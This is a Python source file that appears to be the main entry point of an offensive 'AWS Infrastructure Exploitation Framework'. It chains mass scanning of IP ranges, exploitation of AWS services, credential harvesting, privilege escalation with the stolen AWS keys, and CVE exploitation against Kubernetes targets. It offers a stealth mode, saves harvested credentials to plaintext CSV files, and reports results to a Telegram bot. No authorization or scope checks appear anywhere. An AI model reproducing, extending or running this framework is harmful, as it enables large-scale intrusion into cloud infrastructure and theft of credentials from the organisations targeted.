#!/usr/bin/env python3
"""
ğŸš€ AWS Infrastructure Exploitation Framework - Main Entry Point
Unified CLI for comprehensive AWS/Kubernetes exploitation

Author: wKayaa
Date: 2025-01-28
"""

import asyncio
import argparse
import sys
import time
import json
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
import logging

# Framework components with fallback imports
try:
    from aws_infrastructure_exploiter import AWSInfrastructureExploiter
    from ip_scanner import IPScanner
    from aws_privilege_escalator import AWSPrivilegeEscalator, AWSCredential
    from cve_exploiter import CVEExploiter
    from credential_harvester import CredentialHarvester
    from integrations.telegram_notifier import TelegramNotifier
    COMPONENTS_AVAILABLE = True
except ImportError as e:
    print(f"âš ï¸ Some components unavailable: {e}")
    print("Running in demo mode...")
    COMPONENTS_AVAILABLE = False


class MainExploitFramework:
    """Main AWS infrastructure exploitation framework"""
    
    def __init__(self, args):
        self.args = args
        self.start_time = time.time()
        
        # Initialize logging
        self._setup_logging()
        self.logger = logging.getLogger("MainFramework")
        
        # Check component availability
        if not COMPONENTS_AVAILABLE:
            self.logger.error("âŒ Required components not available - install dependencies first")
            sys.exit(1)
        
        # Initialize components
        self.ip_scanner = IPScanner(
            max_concurrent=args.workers,
            timeout=args.timeout,
            stealth_mode=args.mode == "stealth"
        )
        
        self.aws_exploiter = AWSInfrastructureExploiter(
            max_concurrent=args.workers,
            timeout=args.timeout,
            stealth_mode=args.mode == "stealth"
        )
        
        self.privilege_escalator = AWSPrivilegeEscalator(
            timeout=args.timeout,
            max_concurrent=min(args.workers, 50)  # Limit for privilege escalation
        )
        
        self.cve_exploiter = CVEExploiter(
            timeout=args.timeout,
            max_concurrent=min(args.workers, 50),
            stealth_mode=args.mode == "stealth"
        )
        
        self.credential_harvester = CredentialHarvester(
            timeout=args.timeout,
            max_concurrent=args.workers
        )
        
        # Initialize Telegram if configured
        self.telegram = None
        if args.telegram_token and args.telegram_chat:
            self.telegram = TelegramNotifier(args.telegram_token, args.telegram_chat)
        
        # Results storage
        self.results = {
            "scan_results": [],
            "exploitation_results": [],
            "credentials": [],
            "privilege_escalations": [],
            "cve_exploits": [],
            "metadata": {
                "start_time": datetime.utcnow().isoformat(),
                "mode": args.mode,
                "targets": [],
                "configuration": vars(args)
            }
        }
        
    def _setup_logging(self):
        """Setup logging configuration"""
        level = logging.DEBUG if self.args.debug else logging.INFO
        
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler(f"aws_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
            ]
        )
        
    async def run_exploitation(self) -> Dict:
        """Main exploitation pipeline"""
        try:
            self.logger.info("ğŸš€ Starting AWS Infrastructure Exploitation Framework")
            
            # Initialize Telegram notifications
            if self.telegram:
                await self.telegram.initialize()
                
            # Load targets
            targets = await self._load_targets()
            if not targets:
                self.logger.error("âŒ No valid targets loaded")
                return self.results
                
            self.results["metadata"]["targets"] = targets
            self.logger.info(f"ğŸ¯ Loaded {len(targets)} targets for {self.args.mode} mode")
            
            # Execute pipeline based on mode
            if self.args.mode in ["scan", "all"]:
                await self._phase_1_discovery(targets)
                
            if self.args.mode in ["exploit", "aws-escalation", "k8s-exploit", "aggressive", "all"]:
                await self._phase_2_exploitation()
                
            if self.args.mode in ["harvest", "all"]:
                await self._phase_3_credential_harvesting()
                
            if self.args.mode in ["aws-escalation", "aggressive", "all"]:
                await self._phase_4_privilege_escalation()
                
            if self.args.mode in ["k8s-exploit", "aggressive", "all"]:
                await self._phase_5_cve_exploitation()
                
            # Generate final reports
            await self._generate_reports()
            
            # Send final summary
            if self.telegram:
                await self._send_final_telegram_summary()
                
            self.logger.info("âœ… AWS Infrastructure Exploitation completed successfully")
            return self.results
            
        except KeyboardInterrupt:
            self.logger.warning("â¹ï¸ Operation interrupted by user")
            return self.results
        except Exception as e:
            self.logger.error(f"âŒ Critical error: {str(e)}")
            if self.args.debug:
                import traceback
                traceback.print_exc()
            return self.results
            
    async def _load_targets(self) -> List[str]:
        """Load targets from file or command line"""
        targets = []
        
        if hasattr(self.args, 'target') and self.args.target:
            targets.append(self.args.target)
        elif hasattr(self.args, 'targets') and self.args.targets:
            try:
                target_file = Path(self.args.targets)
                if target_file.exists():
                    with open(target_file, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                targets.append(line)
                else:
                    self.logger.error(f"âŒ Target file not found: {self.args.targets}")
            except Exception as e:
                self.logger.error(f"âŒ Error loading targets: {str(e)}")
                
        return targets
        
    async def _phase_1_discovery(self, targets: List[str]):
        """Phase 1: IP Range Scanning & Service Discovery"""
        self.logger.info("ğŸ” Phase 1: IP Range Scanning & Service Discovery")
        
        # Determine scan type based on mode
        scan_type = "aws_focused"
        if self.args.mode == "aggressive":
            scan_type = "comprehensive"
        elif self.args.mode == "scan":
            scan_type = "common"
            
        all_scan_results = []
        
        for target in targets:
            self.logger.info(f"ğŸ¯ Scanning target: {target}")
            
            try:
                if "/" in target:  # CIDR range
                    scan_results = await self.ip_scanner.scan_range(target, scan_type)
                else:  # Single target
                    scan_results = await self.ip_scanner.scan_range(f"{target}/32", scan_type)
                    
                all_scan_results.extend(scan_results)
                
                # Send progress update
                if self.telegram and len(all_scan_results) % 10 == 0:
                    await self.telegram.send_scan_progress(
                        len(all_scan_results), 
                        len(targets) * 10,  # Rough estimate
                        sum(len(r.get("services", [])) for r in all_scan_results)
                    )
                    
            except Exception as e:
                self.logger.error(f"âŒ Error scanning {target}: {str(e)}")
                
        self.results["scan_results"] = all_scan_results
        
        # Send discovery alert
        if self.telegram and all_scan_results:
            await self.telegram.send_aws_discovery_alert({
                "targets_scanned": len(targets),
                "discovered_services": all_scan_results
            })
            
        self.logger.info(f"âœ… Discovery complete: {len(all_scan_results)} hosts with services found")
        
    async def _phase_2_exploitation(self):
        """Phase 2: AWS Service Exploitation"""
        self.logger.info("ğŸ¯ Phase 2: AWS Service Exploitation")
        
        if not self.results["scan_results"]:
            self.logger.warning("âš ï¸ No scan results available for exploitation")
            return
            
        # Convert scan results to exploitation targets
        exploitation_targets = []
        for scan_result in self.results["scan_results"]:
            for service in scan_result.get("services", []):
                if service.get("aws_related", False):
                    exploitation_targets.append({
                        "target": scan_result["ip"],
                        "service": service["service"],
                        "endpoint": f"http://{scan_result['ip']}:{service['port']}",
                        "details": service
                    })
                    
        if not exploitation_targets:
            self.logger.warning("âš ï¸ No AWS services found for exploitation")
            return
            
        self.logger.info(f"ğŸ¯ Exploiting {len(exploitation_targets)} AWS services")
        
        # Initialize AWS exploiter and run exploitation
        await self.aws_exploiter.initialize()
        
        try:
            # Group targets by IP for efficiency
            targets_by_ip = {}
            for target in exploitation_targets:
                ip = target["target"]
                if ip not in targets_by_ip:
                    targets_by_ip[ip] = []
                targets_by_ip[ip].append(target)
                
            # Run exploitation
            exploitation_results = await self.aws_exploiter.exploit_infrastructure(
                list(targets_by_ip.keys()), 
                mode=self.args.mode
            )
            
            self.results["exploitation_results"] = exploitation_results.get("exploited_targets", [])
            
            # Send exploitation alerts
            if self.telegram:
                for result in self.results["exploitation_results"]:
                    await self.telegram.send_exploitation_success(result)
                    
        finally:
            await self.aws_exploiter.cleanup()
            
        self.logger.info(f"âœ… Exploitation complete: {len(self.results['exploitation_results'])} successful exploits")
        
    async def _phase_3_credential_harvesting(self):
        """Phase 3: Advanced Credential Harvesting"""
        self.logger.info("ğŸ”‘ Phase 3: Advanced Credential Harvesting")
        
        # Combine scan and exploitation results for harvesting
        harvest_targets = []
        
        # Add scan results
        for scan_result in self.results["scan_results"]:
            if scan_result.get("services"):
                harvest_targets.append({
                    "target": scan_result["ip"],
                    "services": scan_result["services"]
                })
                
        # Add exploitation results
        harvest_targets.extend(self.results["exploitation_results"])
        
        if not harvest_targets:
            self.logger.warning("âš ï¸ No targets available for credential harvesting")
            return
            
        self.logger.info(f"ğŸ” Harvesting credentials from {len(harvest_targets)} targets")
        
        # Run credential harvesting
        harvest_results = await self.credential_harvester.harvest_credentials(harvest_targets)
        
        # Extract all credentials
        all_credentials = []
        for result in harvest_results:
            all_credentials.extend([
                {
                    "type": cred.type,
                    "value": cred.value,
                    "confidence": cred.confidence,
                    "source": cred.source,
                    "risk_level": cred.risk_level,
                    "metadata": cred.metadata
                }
                for cred in result.credentials
            ])
            
        self.results["credentials"] = all_credentials
        
        # Send credential alerts
        if self.telegram and all_credentials:
            await self.telegram.send_credential_alert(all_credentials)
            
        self.logger.info(f"âœ… Credential harvesting complete: {len(all_credentials)} credentials found")
        
    async def _phase_4_privilege_escalation(self):
        """Phase 4: AWS Privilege Escalation"""
        self.logger.info("ğŸ“ˆ Phase 4: AWS Privilege Escalation")
        
        # Extract AWS credentials for escalation
        aws_credentials = []
        for cred in self.results["credentials"]:
            if cred["type"].startswith("aws_"):
                # Group AWS credentials by access key
                access_key = cred["value"] if cred["type"] == "aws_access_key" else None
                if access_key:
                    # Find corresponding secret key and session token
                    secret_key = None
                    session_token = None
                    
                    for other_cred in self.results["credentials"]:
                        if (other_cred["source"] == cred["source"] and 
                            other_cred["type"] == "aws_secret_key"):
                            secret_key = other_cred["value"]
                        elif (other_cred["source"] == cred["source"] and 
                              other_cred["type"] == "aws_session_token"):
                            session_token = other_cred["value"]
                            
                    if secret_key:
                        aws_credentials.append(AWSCredential(
                            access_key=access_key,
                            secret_key=secret_key,
                            session_token=session_token,
                            source=cred["source"]
                        ))
                        
        if not aws_credentials:
            self.logger.warning("âš ï¸ No AWS credentials available for privilege escalation")
            return
            
        self.logger.info(f"ğŸ¯ Attempting privilege escalation with {len(aws_credentials)} credential sets")
        
        # Run privilege escalation
        escalation_results = await self.privilege_escalator.escalate_privileges(aws_credentials)
        
        self.results["privilege_escalations"] = [
            {
                "success": result.success,
                "method": result.method,
                "original_permissions": result.original_permissions,
                "escalated_permissions": result.escalated_permissions,
                "details": result.details,
                "timestamp": result.timestamp
            }
            for result in escalation_results
        ]
        
        # Send escalation alerts
        if self.telegram:
            for result in escalation_results:
                if result.success:
                    await self.telegram.send_privilege_escalation_alert({
                        "method": result.method,
                        "original_permissions": result.original_permissions,
                        "escalated_permissions": result.escalated_permissions
                    })
                    
        successful_escalations = len([r for r in escalation_results if r.success])
        self.logger.info(f"âœ… Privilege escalation complete: {successful_escalations} successful escalations")
        
    async def _phase_5_cve_exploitation(self):
        """Phase 5: CVE Exploitation"""
        self.logger.info("ğŸ’¥ Phase 5: CVE Exploitation")
        
        # Prepare targets for CVE exploitation
        cve_targets = []
        
        # Add exploitation results as targets
        for result in self.results["exploitation_results"]:
            cve_targets.append({
                "target": result["target"],
                "service": result["service"],
                "endpoint": result.get("exploitation", {}).get("endpoint"),
                "services": [result["service"]]
            })
            
        # Add scan results with AWS services
        for scan_result in self.results["scan_results"]:
            aws_services = [s for s in scan_result.get("services", []) if s.get("aws_related")]
            if aws_services:
                cve_targets.append({
                    "target": scan_result["ip"],
                    "services": [s["service"] for s in aws_services],
                    "endpoint": f"http://{scan_result['ip']}"
                })
                
        if not cve_targets:
            self.logger.warning("âš ï¸ No targets available for CVE exploitation")
            return
            
        self.logger.info(f"ğŸ’¥ Exploiting CVEs against {len(cve_targets)} targets")
        
        # Filter CVEs based on arguments
        cve_filter = None
        if hasattr(self.args, 'cves') and self.args.cves and self.args.cves != "all":
            cve_filter = self.args.cves.split(",")
            
        # Run CVE exploitation
        cve_results = await self.cve_exploiter.exploit_targets(cve_targets, cve_filter)
        
        self.results["cve_exploits"] = [
            {
                "cve_id": result.cve_id,
                "target": result.target,
                "success": result.success,
                "method": result.method,
                "evidence": result.evidence,
                "timestamp": result.timestamp,
                "severity_impact": result.severity_impact
            }
            for result in cve_results
        ]
        
        # Send CVE exploitation alerts
        if self.telegram and cve_results:
            await self.telegram.send_cve_exploitation_alert([
                {
                    "cve_id": r.cve_id,
                    "target": r.target,
                    "success": r.success,
                    "severity_impact": r.severity_impact
                }
                for r in cve_results
            ])
            
        successful_cves = len([r for r in cve_results if r.success])
        self.logger.info(f"âœ… CVE exploitation complete: {successful_cves} successful exploits")
        
    async def _generate_reports(self):
        """Generate comprehensive reports"""
        self.logger.info("ğŸ“Š Generating reports")
        
        # Calculate statistics
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.results["metadata"]["end_time"] = datetime.utcnow().isoformat()
        self.results["metadata"]["duration_seconds"] = duration
        self.results["metadata"]["statistics"] = {
            "targets_scanned": len(self.results["metadata"]["targets"]),
            "services_discovered": sum(len(r.get("services", [])) for r in self.results["scan_results"]),
            "successful_exploits": len(self.results["exploitation_results"]),
            "credentials_found": len(self.results["credentials"]),
            "privilege_escalations": len([r for r in self.results["privilege_escalations"] if r.get("success")]),
            "cve_exploits": len([r for r in self.results["cve_exploits"] if r.get("success")]),
            "success_rate": self._calculate_success_rate()
        }
        
        # Save results to file
        output_dir = Path(self.args.output)
        output_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON report
        json_file = output_dir / f"aws_exploit_results_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
            
        # CSV report for credentials
        if self.results["credentials"]:
            csv_file = output_dir / f"credentials_{timestamp}.csv"
            with open(csv_file, 'w') as f:
                f.write("Type,Value,Confidence,Source,Risk Level\n")
                for cred in self.results["credentials"]:
                    f.write(f"{cred['type']},{cred['value']},{cred['confidence']},{cred['source']},{cred['risk_level']}\n")
                    
        self.logger.info(f"ğŸ“„ Reports saved to {output_dir}")
        
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_attempts = (
            len(self.results["scan_results"]) +
            len(self.results["exploitation_results"]) + 
            len(self.results["privilege_escalations"]) +
            len(self.results["cve_exploits"])
        )
        
        if total_attempts == 0:
            return 0.0
            
        successful_operations = (
            len([r for r in self.results["scan_results"] if r.get("services")]) +
            len(self.results["exploitation_results"]) +
            len([r for r in self.results["privilege_escalations"] if r.get("success")]) +
            len([r for r in self.results["cve_exploits"] if r.get("success")])
        )
        
        return successful_operations / total_attempts
        
    async def _send_final_telegram_summary(self):
        """Send final summary to Telegram"""
        if not self.telegram:
            return
            
        stats = self.results["metadata"]["statistics"]
        duration_str = f"{stats['duration_seconds']:.0f}s"
        
        await self.telegram.send_final_summary({
            "targets_scanned": stats["targets_scanned"],
            "services_discovered": stats["services_discovered"],
            "successful_exploits": stats["successful_exploits"],
            "credentials_found": stats["credentials_found"],
            "privilege_escalations": stats["privilege_escalations"],
            "cve_exploits": stats["cve_exploits"],
            "duration": duration_str,
            "success_rate": stats["success_rate"]
        })


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='ğŸš€ AWS Infrastructure Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Scan large IP range for AWS infrastructure
  python main_exploit.py --targets 10.0.0.0/16 --mode aws-escalation --workers 200

  # Focus on EKS clusters with CVE exploitation
  python main_exploit.py --targets eks-targets.txt --mode k8s-exploit --cves all

  # Credential harvesting with Telegram alerts
  python main_exploit.py --targets 192.168.1.0/24 --mode harvest --telegram-token TOKEN
        '''
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--target', help='Single target (IP/domain/CIDR)')
    target_group.add_argument('--targets', help='Target file path')
    
    # Core options
    parser.add_argument('--mode', choices=[
        'scan', 'exploit', 'harvest', 'aws-escalation', 'k8s-exploit', 'stealth', 'aggressive', 'all'
    ], default='exploit', help='Operation mode')
    
    parser.add_argument('--workers', type=int, default=200,
                       help='Number of concurrent workers (default: 200)')
    parser.add_argument('--timeout', type=int, default=15,
                       help='Timeout per operation in seconds (default: 15)')
    
    # CVE options
    parser.add_argument('--cves', default='all',
                       help='CVEs to exploit (comma-separated or "all")')
    
    # Integration options
    parser.add_argument('--telegram-token', help='Telegram bot token for notifications')
    parser.add_argument('--telegram-chat', help='Telegram chat ID')
    
    # Output options
    parser.add_argument('--output', default='./results',
                       help='Output directory (default: ./results)')
    
    # Advanced options
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--debug', action='store_true',
                       help='Debug mode')
    
    return parser.parse_args()


def print_banner():
    """Display framework banner"""
    banner = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                      â•‘
â•‘                ğŸš€ AWS INFRASTRUCTURE EXPLOITER v1.0                 â•‘
â•‘           Advanced AWS/Kubernetes Exploitation Framework             â•‘
â•‘                        Author: wKayaa                                â•‘
â•‘                   {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}                   â•‘
â•‘                                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ¯ Features:
  â€¢ IP Range Scanning & AWS Service Discovery
  â€¢ AWS Privilege Escalation & Cross-Service Exploitation  
  â€¢ CVE Exploitation Engine (2024-2025 CVEs)
  â€¢ Advanced Credential Harvesting
  â€¢ Real-time Telegram Notifications
  â€¢ High-Performance Async Architecture

âš¡ Pipeline: Scan â†’ Exploit â†’ Extract â†’ Escalate â†’ CVE Exploit â†’ Report
"""
    print(banner)


async def main():
    """Main entry point"""
    try:
        args = parse_arguments()
        
        # Display banner
        print_banner()
        
        # Initialize and run framework
        framework = MainExploitFramework(args)
        results = await framework.run_exploitation()
        
        # Print final statistics
        stats = results.get("metadata", {}).get("statistics", {})
        print(f"\nğŸ Final Statistics:")
        print(f"  Targets Scanned: {stats.get('targets_scanned', 0)}")
        print(f"  Services Discovered: {stats.get('services_discovered', 0)}")
        print(f"  Successful Exploits: {stats.get('successful_exploits', 0)}")
        print(f"  Credentials Found: {stats.get('credentials_found', 0)}")
        print(f"  Privilege Escalations: {stats.get('privilege_escalations', 0)}")
        print(f"  CVE Exploits: {stats.get('cve_exploits', 0)}")
        print(f"  Success Rate: {stats.get('success_rate', 0):.1%}")
        
        return 0
        
    except KeyboardInterrupt:
        print("\nâ¹ï¸ Operation interrupted by user")
        return 1
    except Exception as e:
        print(f"âŒ Critical error: {str(e)}")
        if hasattr(args, 'debug') and args.debug:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))